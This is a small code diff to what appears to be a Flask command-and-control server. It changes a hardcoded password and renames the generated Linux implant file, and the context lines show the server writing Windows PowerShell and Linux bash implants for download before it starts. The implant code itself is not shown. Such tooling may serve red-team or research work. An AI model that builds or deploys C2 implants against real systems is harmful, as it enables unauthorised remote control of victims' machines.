@@ -21,7 +21,7 @@ DELAY = 10
 JITTER = 2
 
 # Known password
-KNOWN_PW = "HeilEmper0r!"
+KNOWN_PW = "password"
 
 # Flask stuff
 app = Flask(__name__)
@@ -244,7 +244,7 @@ if __name__ == '__main__':
     with open("static/win.ps1", 'w') as file:
         file.write(ps)
     bash = implants.lin(SERVER_HOST, SERVER_PORT, DELAY, JITTER)
-    with open("static/lin.sh", 'w') as file:
+    with open("static/lin", 'w') as file:
         file.write(bash)
 
     # Run C2 Server in separate thread
